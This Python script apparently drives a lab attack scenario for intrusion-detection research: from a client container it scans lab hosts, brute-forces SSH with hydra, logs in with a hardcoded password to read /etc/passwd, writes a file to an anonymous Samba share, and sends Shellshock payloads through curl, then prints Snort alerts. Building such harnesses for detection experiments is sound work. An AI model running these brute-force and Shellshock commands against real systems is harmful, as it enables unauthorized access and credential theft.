"""
Execute an independent multi-target attack without lateral movement.

This scenario is designed for recovery-priority experiments where pivot role
should not dominate priority. Every attack action is launched directly from the
client container (10.0.1.11). The script never uses a compromised server to
access another server.

Targets:
- server_ssh at 10.0.2.11: SSH password guessing and successful local access.
- server_samba at 10.0.2.12: SMB enumeration and file write.
- server_shellshock at 10.0.2.13: Shellshock remote command execution.
- server_web1/server_web2 at 10.0.2.14/10.0.2.15: lightweight probing only.
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"
SERVER_SSH = "10.0.2.11"
SERVER_SAMBA = "10.0.2.12"
SERVER_SHELLSHOCK = "10.0.2.13"
SERVER_WEB1 = "10.0.2.14"
SERVER_WEB2 = "10.0.2.15"


def run(command: str) -> str:
    """Execute a command from the client container and log the result."""
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def main() -> None:
    """Run the no-lateral attack and print resulting Snort alerts."""
    logger.info("=== No-Lateral Stage 1: Host discovery from client only ===")
    for target in (SERVER_SSH, SERVER_SAMBA, SERVER_SHELLSHOCK, SERVER_WEB1, SERVER_WEB2):
        run(f"ping -c 2 -W 1 {target}")
        time.sleep(0.2)

    logger.info("=== No-Lateral Stage 2: Service scan from client only ===")
    run(
        "nmap -sT -Pn -p 22,80,139,445 "
        f"{SERVER_SSH} {SERVER_SAMBA} {SERVER_SHELLSHOCK} {SERVER_WEB1} {SERVER_WEB2}"
    )

    logger.info("=== No-Lateral Stage 3: SSH password guessing on server_ssh ===")
    run(f"hydra -l admin -P /opt/passwords.txt -t 4 -f ssh://{SERVER_SSH} 2>&1 || true")

    logger.info("=== No-Lateral Stage 4: Direct SSH access on server_ssh only ===")
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        f"admin@{SERVER_SSH} 'whoami; id; hostname; uname -a' 2>&1 || true"
    )
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        f"admin@{SERVER_SSH} 'cat /etc/passwd; ls -la /home/admin' 2>&1 || true"
    )

    logger.info("=== No-Lateral Stage 5: SMB enumeration and write on server_samba ===")
    run(f"smbclient -L //{SERVER_SAMBA} -N 2>&1 || true")
    run(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'pwd; ls; put /etc/hostname no_lateral_payload.txt; ls' "
        "2>&1 || true"
    )

    logger.info("=== No-Lateral Stage 6: Shellshock RCE on server_shellshock ===")
    run(
        "curl -s -H 'User-Agent: () { :;}; echo; /usr/bin/id' "
        f"http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable 2>&1 || true"
    )
    run(
        "curl -s -H 'User-Agent: () { :;}; echo; /bin/cat /etc/passwd' "
        f"http://{SERVER_SHELLSHOCK}/cgi-bin/vulnerable 2>&1 || true"
    )

    logger.info("=== No-Lateral Stage 7: Lightweight web probing only ===")
    for target in (SERVER_WEB1, SERVER_WEB2):
        run(f"curl -s -o /dev/null -w 'http_status=%{{http_code}}\\n' http://{target}/")
        time.sleep(0.2)

    logger.info("=== No-lateral attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
